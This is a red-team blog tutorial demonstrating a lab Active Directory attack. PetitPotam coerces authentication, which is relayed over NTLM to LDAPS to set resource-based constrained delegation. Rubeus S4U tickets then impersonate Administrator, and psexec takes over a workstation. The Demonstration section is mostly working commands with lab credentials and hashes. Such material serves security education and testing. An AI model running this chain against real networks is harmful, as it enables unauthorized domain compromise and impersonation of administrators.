<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/lateral-movement/" rel="category tag">Lateral Movement</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Lateral Movement: WebClient Workstation Takeover</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/" rel="bookmark"><time class="entry-date published" datetime="2022-03-24T17:42:09+00:00">March 24, 2022</time><time class="updated" datetime="2025-06-23T19:17:03+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we explore how a WebClient Workstation Takeover can occur during lateral movement by abusing WebDAV shares. Inspired by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/tifkin_/status/1418855927575302144?s=20">@tifkin_’s</a></strong></span> and the Certified Pre-Owned <span style="color: #0000ff;"><strong>whitepaper </strong></span>,this attack chains PetitPotam, NTLM relay, and Resource-Based Constrained Delegation (RBCD) to compromise multiple systems in a domain environment.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;"><strong>WebDav Protocol</strong></span></li>
<li><span style="color: #000000;"><strong>WebClient Service</strong></span></li>
<li><span style="color: #000000;"><strong>Background</strong></span></li>
<li><span style="color: #000000;"><strong>Demonstration</strong></span></li>
<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
</ul>
<h3><span style="color: #800000;">WebDav Protocol</span></h3>
<p><span style="color: #000000;">According to Wikipedia, “WebDAV (Web Distributed Authoring and Versioning) provides a set of extensions to the Hypertext Transfer Protocol (HTTP), allowing user agents to collaboratively author contents directly in an HTTP web server by providing facilities for concurrency control and namespace operations, thus enabling users to view the Web as a writeable, collaborative medium and not just a read-only medium.”</span></p>
<h3><span style="color: #800000;">WebClient Service</span></h3>
<p><span style="color: #000000;">WebClient service allows users to connect to WebDav shares and write data onto the server. .NET based servers (like IIS) always use WebClient service for giving users WebDav shares’ access while other servers might not. The service is disabled/stopped by default but can be installed by referring to the guide <a style="color: #000000;" href="https://theitbros.com/installing-webdav-client-windows-server-2016/">here</a>.</span></p>
<p><span style="color: #000000;">But just to give you a rundown of the commands, setup can be done as follows:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Install-WindowsFeature WebDAV-Redirector –Restart
Get-WindowsFeature WebDAV-Redirector | Format-Table –Autosize
Set-Service WebClient -StartupType Automatic
Set-Service MRxDAV -StartupType Automatic
Start-Service WebClient
Start-Service MRxDAV</pre>
<p><span style="color: #000000;">Once the webclient service has been started you can verify it manually by the command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc query webclient</pre>
<h3><span style="color: #000000;"><strong> </strong></span><span style="color: #800000;">Background</span></h3>
<p><span style="color: #000000;">One constraint of the technique is that WebClient is not active by default. To learn how to activate it programmatically follow the link <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.tiraniddo.dev/2015/03/starting-webclient-service.html">here</a> </strong></span>but we won’t be showing that here. In this article, we have already set up machines with WebClient up and running.</span></p>
<p><span style="color: #000000;">Now, to exploit, we will first trigger the machine account’s authentication to our attacker system (by setting up a responder server and using PetitPotam to force authentication) then we will relay the authentication information to LDAPS in order to configure RBCD (resource-based constrained delegation) and finally use delegation to generate a service ticket and takeover multiple workstations.</span></p>
<p><span style="color: #000000;">I highly recommend reading our blog posts about PetitPotam and Resource-Based Constrained Delegation <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/">here</a> </strong></span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/">here</a> </strong></span>for a better understanding of this article.</span></p>
<h3><span style="color: #800000;">Demonstration</span></h3>
<p><span style="color: #000000;">PetitPotam or Print Spooler use the named pipe technique to exploit but first, we need to check if the web client is running or not. For the compromised local system, this can be checked using</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc query webclient</pre>
<p><span style="color: #000000;">And if it is in a stopped state, it can be started using</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc start webclient</pre>
<p><span style="color: #000000;"><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/tifkin_/status/1419806476353298442?s=20">Lee Christensen</a></strong></span> observed that a query to the named pipe “DAV RPC SERVICE” can confirm this remotely as well. <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/G0ldenGunSec">G0ldenGunSec</a> </strong></span>created a tool in C# that is capable to query the mentioned named pipe using execute-assembly. It can be found <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/G0ldenGunSec/GetWebDAVStatus">here</a></strong></span>. On the compromised system’s terminal we can execute the binary to check webclient service’s status on any number of systems in the format:</span></p>
<p><span style="color: #000000;">GetWebDAVStatus.exe server 1, server 2, server3…</span></p>
<p><span style="color: #000000;">Thus, to check WebClient service on 192.168.1.2 we do:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">GetWebDAVStatus.exe 192.168.1.2</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh81JXmkDpvq0Va_tLrSvxD8pS2J9F0Gm2DvG2N0kqvcI9PzGNpMdB3YP-aYr12vdbdMiPeONOcyxQKRfATJHfBitsWd4uTHybq9lmlKwndDxfdqY5NX56RElFeXq3sNIv1WFj1BcOvtKFqe3aaH5BxakVB7pjK2DvLeDYZGgyH27k9Ik2ruuUKOi1ajA/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Another tool to check the same thing is called <strong>webclientservicescanner </strong>developed in Python by pixis which can be downloaded <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/Hackndo/WebclientServiceScanner">here</a></strong></span>. It is capable to check machines in batches by specifying CIDR or IP addresses in the following format:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/Hackndo/WebclientServiceScanner
python3 setup.py
webclientservicescanner ignite.local/harshit:Password@1@192.168.1.2-192.168.1.4</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJfa-elVkhPW8boa1jaKE4muUfspb0T7J46UPL0bVc9NCQ2OgOGVXIIwjWRoddW-KjLCiQr2QTBi3PUijcAUFx6ggRSYB9mM02-ejIfJMxOe2cIFNx_x_vNcMPVF0gZYT0qJuGmY4r0U1-KUWprDIDBPTqXc3Bg01uB0osAvyny0oPYq45f4Tl3wnRLg/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Crackmapexec tool in Impacket’s suite can also be used to do the same now. It is available by default in Kali too. The “-M” flag does this however, the attacker needs to have one valid set of credentials (even low priv should work)</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.2 -u Harshit -p Password@1 -M webdav</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvDcMvkLClL6-7e3MQaOcH7AWOZapDE-3s4APkPHd5eJQXKi9jbZMhjjoA50Zd6Dzw1CyTW5i_85BfVM61mPJZlxttmgaja382xZLSgVDftOtVZo9FDvaIoXbHTLpbqUbtR1seZK44eANNDDuktcPsWF8dFjN77kpfW5gTLg3kFGgx4epyKzO74BzD1A/s16000/3.png"/></span></p>
<h4><span style="color: #000000;">Setting Up Responder and Triggering Authentication</span></h4>
<p><span style="color: #000000;">Let’s set up our responder first. Responder is required to get a network name. WebClient service works in such a way that clients authenticate using the network name. Responder can help us get that and thus, without it, the attack won’t work. We need to edit the Responder.conf file and turn off HTTP and SMB server as they’d clash with our NTLM relay server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /usr/share/responder/Responder.conf</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0TThyD4UEa9KJr2TRnWFP_M2A1WS5T_Wqy3OeC_hdqp_668eY2O2Go2LQ3HZ0Lbo8fHfo7O7gxftESA_JiUqAh9W7vgEltFdOOO6z7VVQpsEaId7Lu-M2BPUpOe45jHqRfsK3eXm783QAPjnmHBvSd35Md0MW1EPmXwYt9dj8OW6Jv_wF5WXPehFX9w/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Lastly, we need to set up an NTLM relay to configure RBCD (using -the delegate-access flag). Here, dc1.ignite.local is the DC whose LDAP we will be targeting.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ntlmrelayx.py -t ldaps://dc1.ignite.local --delegate-access -smb2support</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4hnYFzQlPYDEoEIZFoTgVKGsW4RVpUTZzo3Ljt29gFsPLlbTM_XlAo_0k4oazkkYK2ZUh7YiZPio44ysl19tYbO0N4CpAWzDC3ZzO_IrGiSJJEfybjNd57ZA3IrEW_obw2_dKXb5roTNzipk_Mm_KIoGZFZ5qBAXTB7Dv-OyMLK1XkwNnEnYWLbqndA/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Now, we can start our responder too</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">responder -I eth0</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUHJE2DrM-yCwinZDmu0lkkPdCShwPJ7BSlO5VPEXnjlrca1XTh90FdQH8GFQ6e20SUT2r5mSz49zaJjSMvDtbezRHbPLG7CULC86F1h98cidI1C7pKmHz7qHqqzPefQl1TPxVwIJtbolY9-roF2u8GhOYZgMQ0M1z_y_ahv1fi1Wx9489-2hf8n06Vg/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Once the responder has started you need to note the temporary network name Responder has assigned to the Kali system. This network name will be used in the next few steps to conduct the attack.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgLBXvJ1ar_mTHpgILb2XlNs7098c3gxIFsmKCNkCLns_rEdSGuImEHOD_vrSgZzODAquwzzjjUF0-2UUj_fD-hmVnW6Ous8FH7uL6DSVyQ5mdjSbPF-Rc6RE9_AL7Bh0hVjgeNjQTux7H5EL1PFuNu2Oi5kp2fZTmgxtxQwWOOZ9fe2xJ7v2zRvhAMcQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Let’s check if webclient in our target system is active or not</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc query webclilent</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzK1QAc-OARuOB0X2-dSZfcJXk1MO_VetuR69qyqX2xXnxik93XoDaB9RLUV3L9GZArV9HvQ-ryft0CCLE48mu2snz5R94cF7F3wQlan0u3KE5tiv0ba9gPgpijRs4ZTsH9bE-OcXfBayWP7S6Jzc_RgdTKTrfRoatQfh9h58MBRhrbyroOefV5Q_ybg/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Now that we have set up our relays, we need to force authentication to this rogue server (responder). Many of the printspooler attacks can do this. We will be using the petitpotam.exe file available <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/topotam/PetitPotam">here</a></strong></span>. Format is:</span></p>
<p><span style="color: #000000;">PetitPotam.exe relay-network-name@port/random_file Target-IP method</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">PetitPotam.exe WIN-AZGYNGYRUL1@80/raj 192.168.1.3 1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjO7WqV_QWLSeVg4oqgWY7WEBt2dXeZ0nw7Pvx0P_FqHfWTpIZd3mJ1YmuQ3zBD1Weln2naZjQo81lyH7sWwVYcNozKPoZXQ_4r8sLnM3JkCZD8Y4fPoVWj8t1VlIhEryALxTrq27TLI337gxRAZqTdNCi9Cumt2AOAjmGdsE3qKEDv6xlsASt1jqgUA/s16000/9.png"/></span></p>
<p><span style="color: #000000;">This way, the victim system reaches our NTLM relay. Responder helps us in accepting connections coming from PetitPotam as it provides us with a network name. Now, NTLM relay accepts the authentication request, relays it to LDAPS on the DC and creates a machine account (IWGADVYY$) with delegation privileges to the machine/computer account of the system we used to conduct the attack (workstation01). Hence, the newly created machine account can now impersonate any user related to the workstation01 account. (even admin!)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgq1IKxUIaELuAh7_hoRfaKfPfKVDokc8-cfQLiVL51NN61MKCCAV6Q_tzY9TvpizVaHTLjFwmJdKQRqzyMfbItn8iZSKldIM-rC5fpkbOp-I6zl4F8_nPRD5ydpUvctwQRVKTK5SEgTvx94LpILe_DiEnBvOebSWnVmZ0y2UARiJHAXMwRL3k3Awbz2g/s16000/10.png"/></span></p>
<h4><span style="color: #000000;">Ticket Extraction, Conversion, and Privilege Escalation</span></h4>
<p><span style="color: #000000;">An admin can detect such attacks by checking the computer account’s list and noting newly added computer accounts. In the admin system, we see our machine account has been added</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgG5erzFeQaCWxcAYzgVAdMbsHyNjHXj5PMNIaSiS2lMvEuwvMmSEb2CXWhllYy1WUQ-53P3_y5ldWsYTdRCIs4-eqCjh00uKfN2fPhe5Jn_GMcGwiJVad4ToMR3tujFbujTRSqlht14U81Hy2_6nv3HOeLKyQ_fUv5WzuInrU24kWl2ddwzwu5rk8Y6g/s16000/11.png"/></span></p>
<p><span style="color: #000000;">You can view various permissions of this machine account on the workstation01$ account under the security section.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgp2U0HcpRWQWABmEUpizZX2UknDCunDqsiQOfGVaCO_VJVb9zsKWPolh5YRw5tIW27VotUPJ24eF8brb5ee6usEf0Frd3qc-iAJqdpvObc0R5eJ7zV5bFRq6vC4UqLbkiwUOZYF4Vm1pdZ_7kxi_ajoPYvW2AdrglDioFqcdOjY2zsCuQVoW_zUJvpqQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Also, if you check workstation01$ attribute editor, you’d see that someone has filled the msDS-AllowedToActOnBehalfOfOtherIdentity to delegate access to IWGADVYY$.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdFMP8RsiDITjsZ7L4FKZ1AM5Gqcag2memSm9URdkYJ9G-CeKqPdsdapZeVsAsbrEz2lyoDFNAfw54poIpPx6wzcwBwPrW5hsNCtcxt7w4kgzxZ-xLoph_iFA2eXZL3PMBFej9fZ-8N4zPeqvGZtIEqMS8LWmd9c4e-xfla50w6ZaTlk-8kg7pGv01Kw/s16000/13.png"/></span></p>
<p><span style="color: #000000;">Now that we can access the newly added computer’s credentials, we can generate hashes using Rubeus.exe to use later with the s4u2proxy attack. In any Windows system available to you, download <a style="color: #000000;" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">Rubeus</a> and then open Powershell (as CMD has troubles processing certain special symbols used in passwords) and type the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\rubeus.exe hash /domain:ignite.local /user:IWGADVYY$ /password:']HzFe^[k5)lCH6R'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh78oWH7hh1ihXii_o-1mB9-6_kujtGT1i98yFoFagTkKqogi4jUM1UeC80qk2VACwGn6MmygTOEpSMNh0f8fD8myDWiuEkXjjxQVnjEoj4UV44yDk3RR5JtGUeSLWzpKqhnnOUFgAyjaxDCTy2kDeaidZrqpzfsF4RIGJ_Pm8ow7jM6nAWgNXfwe4nyg/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Any of the obtained hash should work with Rubeus flags (/rc4, /aes128 etc). We note the AES256 hash and then generate service tickets using Rubeus. Here, we can specify any user to impersonate and the service CIFS is to be chosen.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Rubeus.exe s4u /user:IWGADVYY$ /aes256:3A2DE2A575980D93A8C57710C65214AA1E55010B4C612FBE7620AE17F01EC753 /impersonateuser:Administrator /msdsspn:host/workstation01.ignite.local /altservice:cifs /nowrap /ptt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGfwndUAbrm-dBAFLpCflvTuulCuCRwRXXWUTLL9NQYBcAWVlnoN-gPApai2jTK-wkuCrUZAhyUr3mL4H2Ft4dKpe12_VQT2l68BoGtjMqti--VbpjL_t18923CUWBn4Jnj3Lhka9AA2GB0nXIm3SzLGy7h6oKFZog_m9Io433V-FjfUkkhIVrj-VuQA/s16000/15.png"/></span></p>
<p><span style="color: #000000;">The same thing can be done remotely using the getST.py script. Refer to our article <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/">here</a> </strong></span>to read more. As you would be able to see, the system generated a successful TGT request, and it has now generated three service tickets. The first ticket is the machine account’s own ticket. The Administrator account’s ticket is the second ticket, and the third one is a CIFS ticket, which we show below. You can view this using the klist command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkyeNUtVozna7nX4myqXrHOSB_c15kPdxTnLeUnkGzAItIR4OisAcMfSpbZvE1ebHIP9zD3-nTRPZPgbOx83-0ltHM2VZH1zu1N8R8U1tILzAETh53HfrDuFy8_K0Yj5AtklN8zp8Y-aHBaUY9O8ljRaZnLnDFoxxWXH8fLqDI5IHH5w3MnqdXRt8Ghg/s16000/16.png"/></span></p>
<p><span style="color: #000000;">We will work with the last ticket collected. We copy this and decode this base64 value and copy it in a file called ticket.kirbi. Then, we will use ticketConverter.py to convert it to a ccache file, as Rubeus uses the kirbi format but Impacket uses the ccache format. Thereafter we set an environment variable KRB5CCNAME to this ticket’s path</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "base64 value" | base64 -d &gt; ticket.kirbi
ticketConverter.py ticket.kirbi admin.ccache
export KRB5CCNAME=admin.ccache</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_2-DkHPAwc7qcuA91QA0H-2aP7wFy1GyGgG6Zojz-FT7VGzI9waJZzYRp9ds163jzc9dm9YrTnxZe9ms3_U3qCGoNfdNa49Cn8eV3_Zb36CO6YPVzr2Q9wyr65fk1DvEbzNu5Egly9Lp2WycCmh5i7DcO3wJfwvqUmktHt1ew5uhBcNkcoARrN3-gcg/s16000/17.png"/></span></p>
<h4><span style="color: #000000;">Remote Access to Impersonated Account</span></h4>
<p><span style="color: #000000;">Finally, we can use psexec to logon to impersonated account (Administrator) on workstation01</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 psexec.py -k -no-pass ignite.local/Administrator@workstation01.ignite.local</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3reHtTTHu2xOtyCAnUFRCbNd_jGY88QOzbMxTcM22SMlpqjT1yZmyu_-swqRZZclJDxDNb2H9wntVRSENElAAbMESu0uH7IcJWezDa_IbSfueBy0kr7GFD0i2dwxMaSVlYGu68xSkL10oXdPd1r9K19XxgZ69U0KcCwjoYndUZBKfmJbmOMtW1ZDUOw/s16000/18.png"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">In the article, we shed some light on abusing webdav shares and then moving laterally on a domain to compromise more computers. First, we created a new machine account and gave delegation access (using PetitPotam), and then we used that account to impersonate other users.</span></p>
<p><span style="color: #000000;">The attack is rare in real life scenarios as WebClient has to be running which also limits the potential subset of lateral movement, however, with the right conditions it can cause heavy damage. Hope you liked the article. Thanks for reading.</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
